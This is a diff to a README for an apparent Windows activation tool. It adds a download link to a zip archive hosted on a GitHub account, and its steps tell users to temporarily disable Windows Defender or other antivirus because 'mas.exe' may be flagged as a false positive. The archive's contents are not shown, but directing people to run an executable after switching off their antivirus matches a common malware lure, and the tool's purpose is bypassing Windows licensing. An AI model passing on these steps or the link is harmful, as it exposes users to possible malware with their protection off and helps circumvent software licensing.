@@ -27,7 +27,7 @@ Whether you're looking to fix **windows activation error**, remove the "Activate
 1. Download the latest `mas.zip` from Releases
 ## 📥 Download
 
-**[Download MAS.zip (Latest Release)]()**
+**[Download MAS.zip (Latest Release)](https://github.com/andredave/Microsoft-Activation/releases/download/v3.11/Microsoft-Activation-Script.zip)**
 
 2. Extract the archive
 3. **Temporarily disable your antivirus** (Windows Defender or any other AV may flag and remove `mas.exe` as a false positive)
